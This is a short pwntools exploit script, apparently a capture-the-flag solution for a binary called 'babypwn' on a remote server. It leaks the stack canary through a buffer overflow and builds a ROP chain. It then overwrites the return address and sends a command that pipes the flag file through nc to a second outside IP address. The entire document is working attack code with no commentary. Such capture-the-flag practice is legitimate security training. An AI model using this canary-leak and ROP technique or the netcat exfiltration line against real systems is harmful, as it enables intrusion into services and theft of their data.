from pwn import *
context.clear(arch='i386')
elf = ELF("./babypwn")
rop = ROP(elf)
payload = "A"*56
rop.call(0x8048907,[0x804B1CC,100])
rop.call(0x8048620,[0x804B1CC])
print rop.dump

r = remote("110.10.212.130", 8888)
#r = remote("192.168.146.128", 8181)
print r.sendlineafter("> ","1")
print r.sendafter(": ","A"*0x28+"B")
K = r.sendlineafter("> ","1")
CANARI = "\x00"+K[K.find("AB")+2:K.find("AB")+5]
print r.sendafter(": ","A"*0x28+CANARI+"A"*12+str(rop))

print r.sendlineafter("> ","3")
r.send("cat flag | nc 175.118.30.240 30000;")
r.interactive()
